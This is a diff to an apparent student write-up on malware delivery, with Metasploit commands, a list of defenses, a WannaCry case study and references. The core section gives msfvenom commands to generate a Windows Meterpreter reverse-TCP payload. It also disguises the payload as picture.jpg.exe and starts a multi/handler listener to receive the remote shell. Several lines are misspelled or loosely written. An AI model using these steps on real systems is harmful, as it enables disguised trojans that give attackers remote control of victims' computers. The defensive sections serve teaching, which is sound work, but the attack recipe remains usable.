@@ -20,19 +20,35 @@ Attacker achieves their objective (data theft, enccryption, remote control).
 '''bash
 # to create payload 
 Use metasploit venom.
-Msfvenom -P window/meterpreter/reverse_tcp lhost(public ip) lport=4444 _f exe > picture . exe
+Msfvenom -p windows/meterpreter/reverse_tcp lhost(public ip) lport=(port number) -f exe > picture.exe
 ls
-show options
-mv picture . exe picture . jpg . exe
+Show options
+Mv picture.exe picture.jpg.exe
 ls
-# To launch the attack
-Msfconsole 
-Use expoit/multi/handler
+# to launch the attack
+Msfconsole
+Use exploit/multi/handler
 Set payload windows/meterpreter/reverse_tcp
 Show options
-Set lhost 
+Set lhost (ip of the attacker)
 Run
 
 ## Defense Strategies 
+Keep systems updated and patched
+Use antivirus and firewalls
+Use endpoint detention and response(EDR) tools
+Keep secure backup offline
+Windows defender
+Train users to recognize phising and suspicious attachments.
 
-set payload windows
+## Case study: Wannacry (2017)
+Vector: SMB expoit (MS17-010) 
+Payload: File encryption and ransom demand
+Impact: Hundreds of thousands of system infected globally
+Lesson: Patch management and packups are critical
+
+## References
+Advanced cybersecurity from networs to defense
+NIST cybersecurity framework
+OWASP-https://owasp.org
+CISA-https:cisa.gov  
